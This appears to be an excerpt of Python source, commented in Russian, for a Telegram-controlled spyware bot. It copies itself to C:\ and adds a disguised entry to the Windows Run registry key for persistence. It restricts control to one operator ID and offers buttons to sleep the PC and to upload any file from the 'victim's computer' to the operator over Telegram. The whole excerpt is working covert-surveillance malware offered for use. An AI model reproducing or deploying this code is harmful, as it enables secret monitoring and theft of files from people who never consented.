...
exe_file_name = "sherlokbot.exe" #Поменяйте название exe файла который будет следить (который вы компилировали)

current_directory = os.path.dirname(os.path.abspath(sys.argv[0]))
exe_file_path_in_current_dir = os.path.join(current_directory, exe_file_name)
exe_file_path_in_c_drive = os.path.join("C:\\", exe_file_name)

is_admin = os.getuid() == 0 if hasattr(os, 'getuid') else ctypes.windll.shell32.IsUserAnAdmin()

if is_admin:
    if not os.path.exists(exe_file_path_in_c_drive):
        shutil.copy2(exe_file_path_in_current_dir, exe_file_path_in_c_drive)

    startup_registry_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_registry_key, 0, winreg.KEY_WRITE)

    winreg.SetValueEx(registry_key, "MyProgram", 0, winreg.REG_SZ, exe_file_path_in_c_drive + " -runas") # вместо MyProgram замаскируйте слежку , она будет добавлена в автозагрузку
...
def create_inline_keyboard():
    ...
    keyboard.add(
        ...
        telebot.types.InlineKeyboardButton('Отправить файл с ПК', callback_data='ask_file_path')
    )
    return keyboard
...
DEVELOPER_USER_ID = 802305368 # введите свой айди аккаунта. который будет иметь доступ к слежке

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.id != DEVELOPER_USER_ID:
        bot.send_message(message.chat.id, 'Вам доступ закрыт!')
        return
...
def handle_callback_query(call):
    if call.data == 'screenshot':
        ...
        bot.send_message(call.message.chat.id, 'Компьютер переведен в спящий режим.')
        put_pc_to_sleep(call.message)

    elif call.data == 'ask_file_path':
        bot.send_message(call.message.chat.id, "Введите путь к файлу на компьютере жертвы:")
        bot.register_next_step_handler(call.message, send_file)
...
def put_pc_to_sleep(message: Message):
    if os.name == 'nt':
        try:
            ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
            bot.send_message(message.chat.id, 'Компьютер переведен в спящий режим.')
        except Exception as e:
            bot.send_message(message.chat.id, f'Ошибка при переводе компьютера в спящий режим: {e}')

def send_file(message: Message):
    file_path = message.text.strip()
    if os.path.exists(file_path) and os.path.isfile(file_path):
        with open(file_path, 'rb') as file:
            bot.send_chat_action(message.chat.id, 'upload_document')  # Show "Uploading document" action status
            bot.send_document(message.chat.id, file, caption=f"Вот ваш файл: {os.path.basename(file_path)}")
    else:
        bot.send_message(message.chat.id, "Файл не найден. Пожалуйста, проверьте правильность пути к файлу.")
